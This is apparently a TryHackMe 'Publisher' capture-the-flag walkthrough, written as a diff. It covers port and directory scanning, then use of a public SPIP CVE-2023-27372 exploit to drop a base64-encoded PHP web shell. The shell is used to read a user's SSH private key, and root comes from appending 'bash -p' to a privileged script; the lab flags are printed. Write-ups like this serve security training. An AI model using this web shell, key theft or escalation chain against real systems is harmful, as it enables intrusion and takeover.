@@ -1,0 +1,133 @@
+Today we are going to solve another tryhackme easy listed machine which is publisher
+
+
+Main IP :: 10.48.137.26
+
+Running all port scan via nmap.
+
+Nmap scan report for ip-10-48-137-26.ap-south-1.compute.internal (10.48.137.26)
+Host is up (0.00087s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Now performing service and version detection scan
+
+Nmap scan report for ip-10-48-137-26.ap-south-1.compute.internal (10.48.137.26)
+Host is up, received echo-reply ttl 64 (0.00044s latency).
+Scanned at 2026-05-31 02:05:27 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:d9:44:e0:38:ec:af:24:aa:59:54:2b:a6:73:fa:23 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUuUQOfnSsYpXObIPQP0emY1/VObbBq+shtwzkE9ao/4WcHspQ5kioDoRZfMQ0tRYZcb8NjjrPymWqnTf/fsQ9nEFwHGRQVnJrA+UTVyEIFoWwe+yIWMDzij1qmftkYCwypNixRXM1Qic4XzQ+FuPl+2TO+bivBzp3Txs8ojktqv2hBcPtNf+Nrt+laVDlBjsYZ+g0WETETEAWWKzlRWIarZW1/fWRo4ci5RfBCUVGnLQCSi6ptGKNQ28ytoNlv73gVJfGqf2guzt49XGnpadIrBj9h+9xM72j0nZxbp7nm4tUMNtWFbgLnSmy8f6HHSXw+BHFRc6+FzxgKScD8RXM1Rll9rj+L4wz302cKB5dI+hMc8O9oG8dvxrHvri+iK0URbBd5ESG2NFzXfwyQDr43UQW1E2rJA52DrbRJq1JchhwGvg0/1vGOkDP1BjuAwNdYrrjmA46KdudqYb+MgKPOiuAE7INP+dJOVAy2yBmp5yp8kqK5RQ1fbjv7JBzyXs=
+|   256 21:8c:0a:95:d3:32:b9:03:ef:61:8a:cb:05:60:cc:b3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ4b1LU7CG8zOW9s3i9GdDUGGvigNXaWVuQYPWPtIsfw8B8FW8Ah62UTkGPDn8gEuFSmJrvRwQgnavrW0xYjSCA=
+|   256 a6:39:61:5e:fa:91:88:3e:d3:2a:79:18:9d:67:f2:2a (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8gkn/LXZDXx8Tizk49ysZiVuBmrsfvwiv+76zSDKz0
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Publisher's Pulse: SPIP Insights & Tips
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+There are 2 ports open and let's start with port 80.
+
+So moving with the port 80 we have a web page let's start to look into the source page and look deep into the 
+
+WE start with looking deep into the source page but we didn't also tried to robots.txt but isn't there let's start with fuzzing directories and files.
+
+ gobuster dir -u http://10.48.137.26/ -w /usr/share/wordlists/dirb/big.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.137.26/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/images               (Status: 301) [Size: 313] [--> http://10.48.137.26/images/]
+/server-status        (Status: 403) [Size: 277]
+/spip                 (Status: 301) [Size: 311] 
+
+So having this we can start to look deep into the files also we will keep deeper fuzzing and for files.
+
+SO moving around the web directories we came to find out that the spip before 4.3.2, 4.2.16 and 4.1.18 is vulnerable to php command injection that can lead to remote code execution.
+
+There is also an another vulnerable parameter we have had over here is https://github.com/nuts7/CVE-2023-27372.
+
+(env) root@ip-10-48-85-160:~/CVE-2023-27372# python3 CVE-2023-27372.py -u http://10.48.137.26/spip/ -c 'echo PD89YCRfR0VUWzBdYD8+|base64 -d>shell.php'
+
+so with this we are going to look http://10.48.137.26/spip/shell.php?0=id
+
+here and we have uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+so starting the reverse shell listener and will get the reverse shell.
+
+http://10.48.137.26/spip/shell.php?0=cat%20/home/think/.ssh/id_rsa
+
+so with this we can read into the file content of id_rsa which will further help us connect as id_rsa.
+
+fa229046d44eda6a3598c73ad96f4ca5
+
+we have the user.txt flag let's try to escalate privileges.
+
+TIME FOR PRIVILEGE ESCALATION::
+
+strings /usr/sbin/run_container 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+__stack_chk_fail
+execve
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+GLIBC_2.4
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+/bin/bash
+/opt/run_container.sh
+
+
+/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash
+ /lib/x86_64-linux-gnu/ld-2.31.so /bin/bash
+think@ip-10-48-137-26:/opt$ 
+
+so we run this.
+
+ /lib/x86_64-linux-gnu/ld-2.31.so /bin/bash
+think@ip-10-48-137-26:/opt$ echo 'bash -p' >> run_container.sh 
+think@ip-10-48-137-26:/opt$ run_container 
+List of Docker containers:
+ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 48 minutes
+
+Enter the ID of the container or leave blank to create a new one: 1
+/opt/run_container.sh: line 16: validate_container_id: command not found
+
+OPTIONS:
+1) Start Container    3) Restart Container  5) Quit
+2) Stop Container     4) Create Container
+Choose an action for a container: 1
+Error response from daemon: No such container: 1
+Error: failed to start containers: 1
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt 
+3a4225cc9e85709adda6ef55d6a4f2ca
+
+and we this we are root and can read root.txt
